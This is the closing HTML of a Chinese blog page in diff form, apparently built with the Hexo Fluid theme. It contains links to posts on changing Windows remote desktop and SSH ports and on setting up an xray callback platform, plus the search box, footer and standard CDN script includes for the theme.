+                      <a href="/2024/07/01/Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%8F%A3%E5%92%8Cssh%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9/" title="Windows 远程桌面端口和 SSH 端口修改">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Windows 远程桌面端口和 SSH 端口修改</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/01/%E6%90%AD%E5%BB%BA%20xray%20%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%96%B9%E6%B3%95/" title="搭建 xray 反连平台的方法">
+                        <span class="hidden-mobile">搭建 xray 反连平台的方法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
